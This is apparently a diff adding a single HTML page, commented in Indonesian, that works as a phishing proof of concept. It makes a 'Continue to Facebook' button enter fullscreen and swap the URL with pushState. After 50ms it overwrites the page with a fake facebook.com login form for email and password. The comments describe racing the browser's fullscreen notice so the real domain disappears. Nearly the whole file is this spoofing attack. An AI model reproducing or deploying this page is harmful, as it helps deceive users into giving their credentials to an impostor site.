@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Legit Page</title>
+</head>
+<body>
+<h1>Click to continue to Facebook</h1>
+<button id="btn" style="padding:20px;font-size:20px">Continue</button>
+
+<script>
+btn.onclick = async () => {
+  // 1. Masuk fullscreen dulu
+  await document.documentElement.requestFullscreen();
+  
+  // 2. Langsung ganti URL tanpa reload pake pushState
+  // Dialog "You are in fullscreen" muncul, tapi langsung ketutup
+  history.pushState({}, '', '/login.php');
+  
+  // 3. Race condition: overwrite DOM sebelum dialog ke-render sempurna
+  setTimeout(() => {
+    document.body.innerHTML = `
+      <div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:white;z-index:999999">
+        <h2 style="padding:20px">facebook.com</h2>
+        <p style="padding:20px">Login to continue</p>
+        <input placeholder="Email" style="margin:20px;padding:10px;width:80%"><br>
+        <input placeholder="Password" type="password" style="margin:20px;padding:10px;width:80%">
+      </div>
+    `;
+    // Fake domain di atas, real domain fb.com udah hilang karena fullscreen
+    document.title = "Facebook";
+  }, 50); // 50ms = timing buat balapan sama dialog Meta
+}
+</script>
+</body>
+</html>
